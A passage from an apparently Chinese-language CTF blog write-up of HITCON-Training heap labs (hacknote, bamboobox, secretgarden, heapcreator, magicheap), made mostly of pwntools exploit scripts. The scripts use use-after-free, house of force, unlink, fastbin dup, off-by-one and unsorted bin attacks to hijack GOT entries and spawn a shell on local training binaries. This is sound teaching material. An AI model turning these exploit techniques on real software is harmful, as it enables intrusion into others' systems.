class="number">0xff</span>),<span class="number">0x7</span>)</span><br><span class="line">payload += <span class="string">'step4\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step3'</span>,payload)</span><br><span class="line"><span class="comment">#step5</span></span><br><span class="line">p.sendlineafter(<span class="string">'step4'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*printnote)();</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>UAF利用，add两个大小32的note，然后free掉，根据FILO的原则，重新add一个8大小的note，content部分会用到第0个note的结构体空间，将print_note覆盖成magic即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"0"</span>)</span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"1"</span>)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(magic))</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>方法一： house of force</strong></p><p>利用<code>change_item</code>里面修改content可以自定义长度的漏洞，修改<code>top chunk size</code>，malloc一个大数/负数来实现控制<code>top_chunk</code>的指针，从而达到任意地址写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc(0x10uLL);</span><br><span class="line">*v3 = hello_message;</span><br><span class="line">v3[1] = goodbye_message;</span><br></pre></td></tr></table></figure></p><p>程序在开头将两个函数地址放进heap中，将<code>goodbye_message</code>改成<code>magic</code>即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">"debug"</span>) </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./bamboobox"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1111"</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)) <span class="comment"># overwrite top chunk size</span></span><br><span class="line">add(<span class="number">-160</span>,<span class="string">"2222"</span>) <span class="comment"># 减小top chunk指针</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>) <span class="comment"># 分配块实现任意地址写</span></span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><strong>方法二：unlink</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:0x00000000000000400x000000000063d030 &lt;== ptr</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:0x00000000000000800x000000000063d080 </span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:0x00000000000000400x000000000063d110</span><br><span class="line">-----------------unlink后-----------------</span><br><span class="line">pwndbg&gt; x/16gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:0x00000000000000400x00000000006020b0 &lt;== ptr</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:0x00000000000000400x000000000063d110</span><br></pre></td></tr></table></figure></p><p>制造fakechunk，修改<code>box0</code>的<code>content</code>指向<code>0x6020c8-0x18</code>，此时修改<code>box0</code>的<code>content</code>，就能写入<code>0x6020b0</code>处，改写成<code>atoi@got</code>，然后泄露地址并修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>, <span class="string">'0'</span> * <span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span> * <span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">'2'</span> * <span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span> <span class="comment"># box0的content</span></span><br><span class="line"></span><br><span class="line">fakeChunk = flat([<span class="number">0</span>, <span class="number">0x41</span>, ptr - <span class="number">0x18</span>, ptr - <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x90</span>])</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x50</span>, fakeChunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x40</span>, elf.got[<span class="string">'atoi'</span>]])</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">show()</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x8</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'$0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab12-secretgarden"><a href="#lab12-secretgarden" class="headerlink" title="lab12-secretgarden"></a>lab12-secretgarden</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序菜单如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 . Raise a flower</span><br><span class="line">2 . Visit the garden</span><br><span class="line">3 . Remove a flower from the garden</span><br><span class="line">4 . Clean the garden</span><br><span class="line">5 . Leave the garden</span><br></pre></td></tr></table></figure></p><p>结构体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct flower</span><br><span class="line">&#123;</span><br><span class="line">  __int64 inuse;</span><br><span class="line">  char *name;</span><br><span class="line">  char color[24];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>漏洞点在<code>del()</code>，存在double free漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !flowercount )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) ) <span class="comment">//没有检查inuse标记位</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD((*(&amp;flowerlist + v1))-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((*(&amp;flowerlist + v1))-&gt;name);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>采用fastbin dup修改free@got即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raiseflower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(length))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"4"</span>)</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"0"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"1"</span>,<span class="string">"red"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">"blue"</span>) <span class="comment">#0</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"1"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"0"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + p64(magic)*<span class="number">2</span> ,<span class="string">"red"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab13-heapcreator"><a href="#lab13-heapcreator" class="headerlink" title="lab13-heapcreator"></a>lab13-heapcreator</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>漏洞点在<code>edit_heap()</code>，留意以下代码，出现了off-by-one漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( heaparray[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Content of heap : &quot;, &amp;buf);</span><br><span class="line">  read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + 1); //多了一字节</span><br><span class="line">  puts(&quot;Done !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>本题需要利用<code>Extend the chunk</code>，利用前提是存在可控的off-by-one，创造出overlap chunk，进而更改其他chunk中的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"0000"</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1111"</span>) <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span>*<span class="number">0x18</span> + <span class="string">"\x41"</span>) <span class="comment"># off by one</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># overlap chunk</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">'atoi'</span>])) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>) <span class="comment"># leak libc.address</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">"atoi"</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab14-magicheap"><a href="#lab14-magicheap" class="headerlink" title="lab14-magicheap"></a>lab14-magicheap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>unsorted bin attack原理：堆在分配的时候，如果在申请的内存大小所对应的small bin或者large bin里面没有找到对应的chunk，此时会从unsorted bin里面去寻找chunk看是否存在合适的内存分配给用户，这个过程中会把unsorted bin链表给清空，清空的过程中没有进行检查，由此可能会发生任意地址可写。源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p><p>如果bck的fd可以被我们控制，这个时候我们就可以让它指向任意地址，最终使<code>*(bck-&gt;fd)+0x10</code>的值被修改成<code>unsorted_chunks(av)</code>(一般来说是一个很大的正数，无法控制)。常见套路是修改<code>global_max_fast</code>全局变量，这个变量用于控制最大的Fast chunk的大小，就能使之后的chunk都被当作fast chunk，即可进行Fast bin attack</p><p>参考代码<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c</a></p><p>漏洞在<code>edit</code>函数，编辑的时候任意指定长度，本题只需要修改<code>magic</code>的值即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heaparray[v2] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size of Heap : "</span>, &amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">  v0 = atoi(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">  read_input(heaparray[v2], v0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./magicheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./magicheap"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content, attack = False)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400C8C\nc\n'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'cccc'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(elf.sym[<span class="string">"magic"</span>] - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x10</span> + <span class="number">0x20</span>, payload)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'dddd'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"4869"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab15-zoo"><a href="#lab15-zoo" class="headerlink" title="lab15-zoo"></a>lab15-zoo</h3><p>参考资料：<a href="https://github.com/0x01f/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf" target="_blank" rel="noopener">https://github.com/0x01f/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 